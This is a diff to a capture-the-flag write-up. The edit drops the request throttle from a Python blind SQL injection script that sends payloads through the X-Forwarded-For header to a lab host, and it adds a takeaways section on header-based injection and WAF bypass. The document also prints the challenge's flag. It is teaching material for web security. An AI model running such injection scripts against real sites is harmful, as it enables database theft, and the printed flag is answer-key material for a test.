@@ -84,10 +84,9 @@ I tested this with a simple true condition and confirmed it worked. Time to buil
 I wrote a Python script with two core functions:
 
 ```python
-import requests, string, time
+import requests, string
 
 URL = "http://10.240.3.154/index.php"
-THROTTLE = 0.05  # Slow down to avoid bans
 TRUE_MAX = 720   # Response length threshold for TRUE condition
 
 def probe(cond: str) -> bool:
@@ -96,7 +95,6 @@ def probe(cond: str) -> bool:
     r = requests.post(URL,
         headers={"X-Forwarded-For": payload},
         data={"user": "a", "pass": "a"})
-    time.sleep(THROTTLE)
     return len(r.text) <= TRUE_MAX
 
 def extract(sql, max_len=64, charset=string.printable):
@@ -207,10 +205,9 @@ As the script ran, character by character, I watched the flag materialize on my 
 ### Solution Script
 
 ```python
-import requests, string, time
+import requests, string
 
 URL = "http://10.240.3.154/index.php"
-THROTTLE = 0.05
 TRUE_MAX = 720
 
 def probe(cond: str) -> bool:
@@ -219,7 +216,6 @@ def probe(cond: str) -> bool:
     r = requests.post(URL,
         headers={"X-Forwarded-For": payload},
         data={"user": "a", "pass": "a"})
-    time.sleep(THROTTLE)
     return len(r.text) <= TRUE_MAX
 
 def extract(sql, max_len=64, charset=string.printable):
@@ -271,6 +267,20 @@ print(f"\n[!] FLAG: {flag_pass}")
 ### Flag
 
 **Flag**: `MCTF25{on3_y34r_b4_fb_but_n0_C1GAR}`
+
+### Key Takeaways
+
+This challenge demonstrates several important web security principles:
+
+**1. Attack Surface Beyond the Obvious** - While the login form was well-protected, the application trusted user-controlled headers like `X-Forwarded-For`. Always validate and sanitize ANY user-controllable input, including HTTP headers used for logging or IP tracking.
+
+**2. Error-Based SQL Injection** - When boolean-based blind SQLi doesn't work, error-based oracles can be powerful. The `LIKE 'a' ESCAPE ''` technique in SQLite is a clever way to trigger controlled errors that reveal information through response differences.
+
+**3. WAF Bypass Through Indirect Vectors** - WAFs often focus on protecting obvious attack vectors (form inputs, URL parameters) but may overlook headers. When direct attacks fail, explore alternative injection points like:
+
+- `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`
+- `User-Agent`, `Referer`
+- Custom application headers
 
 ---
 
